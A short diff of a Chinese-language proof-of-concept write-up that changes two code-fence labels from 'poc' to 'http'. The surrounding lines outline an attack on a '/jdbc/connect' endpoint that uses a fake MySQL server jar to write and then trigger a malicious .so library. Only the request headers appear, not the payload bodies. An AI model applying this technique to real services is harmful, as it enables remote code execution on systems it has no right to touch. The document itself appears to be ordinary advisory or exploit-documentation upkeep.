@@ -113,7 +113,7 @@ fakeServer：`fake-mysql-gui-0.0.4.jar`
 
 写入恶意`.so`：
 
-```poc
+```http
 POST /jdbc/connect HTTP/1.1
 Host: ip:port
 Accept-Language: zh-CN,zh;q=0.9
@@ -126,7 +126,7 @@ Content-Length: 78
 
 触发恶意`.so`:
 
-```poc
+```http
 POST /jdbc/connect HTTP/1.1
 Host: ip:port
 Accept-Language: zh-CN,zh;q=0.9
